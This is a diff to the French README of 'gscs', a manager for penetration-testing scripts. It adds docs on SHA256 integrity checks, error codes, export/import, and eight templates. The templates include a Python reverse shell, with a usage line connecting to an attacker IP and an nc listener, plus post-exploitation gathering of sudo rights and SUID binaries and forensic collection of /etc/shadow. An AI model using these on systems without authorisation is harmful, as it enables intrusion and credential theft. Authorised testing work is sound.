@@ -16,7 +16,11 @@ Aucune dépendance requise. Fonctionne sur toutes les distributions Linux avec P
 | Recherche avancée | Filtres par mot-clé, tags (logique ET), catégorie, langage, date, dépendances, auteur |
 | Exécution sécurisée | Sandboxing Firejail ou Docker avec détection automatique |
 | Vérification des dépendances | Binaires système, packages Python, Go, Ruby gems, commandes personnalisées |
+| Intégrité SHA256 | Empreinte calculée à l'enregistrement, vérifiée systématiquement avant chaque exécution |
+| Codes d'erreur précis | Timeout (124), interpréteur absent (127), permission refusée (126), fichier introuvable (3) |
 | Historique d'exécution | Base SQLite + logs texte quotidiens, export JSON et CSV |
+| Templates intégrés | 8 templates prêts à l'emploi, générables en un seul fichier exécutable |
+| Export / Import | Archive JSON portable avec contenu des fichiers encodé en base64 |
 | Interface CLI | Basé sur `argparse` de la bibliothèque standard, sans dépendance externe |
 | Interface graphique | GUI Tkinter intégré à Python (`gscs gui`) |
 | Configuration | Fichiers JSON ou YAML avec surcharge par projet et variables d'environnement |
@@ -100,7 +104,7 @@ gscs remove nmap_scan
 # Lancer l'interface graphique
 gscs gui
 
-# Utiliser un template de script
+# Générer un script depuis un template
 gscs template list
 gscs template use recon/nmap-quick -o /opt/scripts/nmap_quick.sh --register
 
@@ -122,6 +126,7 @@ gscs add <chemin>         Enregistre un script
   -d, --desc              Description courte
       --deps              Dépendances (ex: "nmap,python:requests")
   -u, --update            Met à jour si le script existe déjà
+      --no-hash           Ne pas calculer l'empreinte SHA256
 
 gscs search [mot-clé]     Recherche avec filtres
   -c, --category
@@ -145,24 +150,217 @@ gscs deps install <nom>   Affiche les commandes d'installation
 gscs remove <nom>         Supprime un script
 gscs gui                  Lance l'interface graphique
 
-gscs template list        Liste les templates disponibles
-gscs template show <nom>  Prévisualise un template
+gscs template list [mot-clé]   Liste les templates disponibles
+gscs template show <nom>       Prévisualise le contenu d'un template
 gscs template use <nom> -o <fichier>
-                          Génère un script depuis un template
-      --register          Enregistre automatiquement le script généré
-      --force             Écrase si le fichier existe déjà
+                               Génère un script depuis un template
+      --register               Enregistre automatiquement dans la bibliothèque
+      --force                  Écrase si le fichier existe déjà
 
-gscs export               Exporte la bibliothèque en archive JSON
-  -o, --output            Fichier de sortie (défaut : stdout)
-  -c, --category          N'exporter qu'une catégorie
-      --no-content        Métadonnées uniquement (sans le contenu des fichiers)
+gscs export                    Exporte la bibliothèque en archive JSON
+  -o, --output                 Fichier de sortie (défaut : stdout)
+  -c, --category               N'exporter qu'une catégorie
+      --no-content             Métadonnées uniquement (sans les fichiers)
 
-gscs import <archive>     Importe depuis une archive JSON
-      --skip-existing     Ignore les scripts déjà enregistrés
-      --update            Écrase les scripts existants sans confirmation
-      --no-restore        Ne pas restaurer les fichiers depuis l'archive
-      --dry-run           Prévisualise sans appliquer les changements
+gscs import <archive>          Importe depuis une archive JSON
+      --skip-existing          Ignore les scripts déjà enregistrés
+      --update                 Écrase les existants sans confirmation
+      --no-restore             Ne pas restaurer les fichiers depuis l'archive
+      --dry-run                Prévisualise sans appliquer les changements
 ```
+
+<br>
+
+## Templates intégrés
+
+Les templates sont des scripts prêts à l'emploi, personnalisables, couvrant les phases classiques d'un pentest.
+
+```bash
+gscs template list              # voir tous les templates
+gscs template show recon/nmap-quick    # prévisualiser
+gscs template use recon/nmap-quick -o scan.sh --register  # générer + enregistrer
+```
+
+### `recon/nmap-quick` — Scan TCP rapide avec Nmap
+**Langage :** bash | **Dépendance :** `nmap`
+
+Lance un scan TCP complet avec détection de services (`-sV`), scripts par défaut (`-sC`) et sauvegarde le résultat dans un fichier `.txt`.
+
+```bash
+./nmap_quick.sh 192.168.1.0/24
+# → nmap -sV -sC -T4 --open -oN nmap_192.168.1.0_24.txt 192.168.1.0/24
+```
+
+---
+
+### `recon/subdomain-enum` — Énumération de sous-domaines par DNS
+**Langage :** python | **Dépendance :** aucune (stdlib uniquement)
+
+Résout en parallèle (50 threads) les sous-domaines d'un domaine cible à partir d'une wordlist. Affiche chaque sous-domaine trouvé avec son IP.
+
+```bash
+python3 subdomain_enum.py exemple.com /usr/share/wordlists/subdomains.txt
+# [+] www.exemple.com           93.184.216.34
+# [+] mail.exemple.com          93.184.216.99
+# [*] Found 2 subdomains for exemple.com
+```
+
+---
+
+### `exploit/revshell-python` — Reverse shell Python
+**Langage :** python | **Dépendance :** aucune
+
+> **Réservé aux tests autorisés uniquement.**
+
+Se connecte en TCP à l'IP/port de l'attaquant et exécute les commandes reçues. Gère les timeouts par commande (30 s) et les erreurs de sortie.
+
+```bash
+# Sur la machine cible (après obtention d'une RCE)
+python3 revshell.py 10.10.14.5 4444
+
+# Sur la machine attaquante
+nc -lvnp 4444
+```
+
+---
+
+### `post-exploit/sysinfo` — Collecte d'informations système
+**Langage :** bash | **Dépendance :** aucune
+
+Rassemble en une passe les informations utiles après compromission : utilisateur courant, interfaces réseau, ports en écoute, droits sudo, binaires SUID, crontabs, variables d'environnement.
+
+```bash
+./sysinfo.sh
+# === SYSTEM ===
+# Linux kali 6.x.x-kali ...
+# === SUDO RIGHTS ===
+# (root) NOPASSWD: /usr/bin/vim
+# === SUID BINARIES ===
+# /usr/bin/sudo  /usr/bin/passwd ...
+```
+
+---
+
+### `post-exploit/persistence-check` — Détection des mécanismes de persistance
+**Langage :** bash | **Dépendance :** aucune
+
+Inspecte les emplacements classiques de persistance Linux : crontabs de tous les utilisateurs, services systemd non-standard, scripts d'initialisation, fichiers `.bashrc`/`.profile`, `authorized_keys`, binaires SUID/SGID.
+
+```bash
+./persistence_check.sh
+# === SYSTEMD SERVICES (non-standard) ===
+# backdoor.service  loaded active running ...
+# === AUTHORIZED KEYS ===
+# --- /home/user/.ssh/authorized_keys ---
+# ssh-rsa AAAA... attacker@kali
+```
+
+---
+
+### `forensic/log-collect` — Collecte de logs pour analyse forensique
+**Langage :** bash | **Dépendance :** aucune
+
+Crée un répertoire horodaté et y copie : logs `/var/log`, journal systemd, liste des processus, connexions réseau, sessions actives (`last`, `who`), `/etc/passwd`, `/etc/shadow`. Génère un manifeste SHA256 de tous les fichiers collectés.
+
+```bash
+./log_collect.sh /mnt/usb/forensic_2026-03-23
+# [*] Collecting to /mnt/usb/forensic_2026-03-23
+# [+] Collection complete
+# [+] Manifest: /mnt/usb/forensic_2026-03-23/MANIFEST.sha256
+```
+
+---
+
+### `custom/skeleton-bash` — Squelette de script Bash
+**Langage :** bash | **Dépendance :** aucune
+
+Modèle de départ pour un script Bash robuste : `set -euo pipefail`, parsing d'arguments avec `getopts`, fonctions `log/ok/err/dbg`, usage automatique.
+
+```bash
+./mon_script.sh -v -o results.txt cible.exemple.com
+```
+
+---
+
+### `custom/skeleton-python` — Squelette de script Python
+**Langage :** python | **Dépendance :** aucune (stdlib uniquement)
+
+Modèle de départ pour un script Python : `argparse` avec `--verbose` et `--output`, logging formaté avec horodatage, structure `main() → int` propre.
+
+```bash
+python3 mon_script.py --verbose -o results.txt cible.exemple.com
+```
+
+<br>
+
+## Export / Import
+
+L'export produit une archive JSON autonome contenant les métadonnées **et le contenu** des fichiers (encodé en base64). L'import restaure les fichiers et ré-enregistre les scripts en une seule commande.
+
+```bash
+# Exporter toute la bibliothèque
+gscs export -o librairie.json
+
+# Exporter uniquement la catégorie recon
+gscs export -o recon.json --category recon
+
+# Exporter sans le contenu des fichiers (métadonnées uniquement)
+gscs export -o meta.json --no-content
+
+# Voir ce qui serait importé sans rien modifier
+gscs import librairie.json --dry-run
+
+# Importer (demande confirmation pour les scripts existants)
+gscs import librairie.json
+
+# Importer sans écraser les scripts déjà présents
+gscs import librairie.json --skip-existing
+
+# Importer et écraser tous les scripts existants
+gscs import librairie.json --update
+```
+
+Format de l'archive :
+
+```json
+{
+  "gscs_archive_version": "1",
+  "gscs_version": "0.1.0",
+  "exported_at": "2026-03-23T12:00:00+00:00",
+  "script_count": 3,
+  "scripts": [
+    {
+      "name": "nmap_scan",
+      "category": "recon",
+      "language": "bash",
+      "tags": "nmap, port-scan",
+      "dependencies": "[\"nmap\"]",
+      "sha256": "a3f1...",
+      "content_b64": "IyEvdXNy..."
+    }
+  ]
+}
+```
+
+<br>
+
+## Intégrité SHA256 et codes d'erreur
+
+À chaque exécution, `gscs run` vérifie automatiquement que le script n'a pas été modifié depuis son enregistrement.
+
+| Situation | Message | Code de sortie |
+|---|---|---|
+| Script introuvable sur disque | `FILE NOT FOUND` + commande de ré-enregistrement | 3 |
+| Hash SHA256 différent de celui enregistré | `INTEGRITY FAILURE` + hash attendu | 2 |
+| Aucun hash enregistré (`--no-hash`) | Avertissement, exécution continue | — |
+| Dépendance manquante | `DEPENDENCY ERROR` + commandes d'installation | 1 |
+| Sandbox demandé non disponible | Avertissement + suggestion d'installation | 1 |
+| Interpréteur absent du PATH | `INTERPRETER NOT FOUND` + hint d'installation | 127 |
+| Permission refusée sur le fichier | `PERMISSION DENIED` + `chmod +x` | 126 |
+| Timeout dépassé | `TIMEOUT` + durée configurée | 124 |
+| Erreur dans le script | `FAILED: script exited with code N` | N |
+
+Les raisons de chaque échec sont enregistrées dans le champ `notes` de l'historique SQLite.
 
 <br>
 
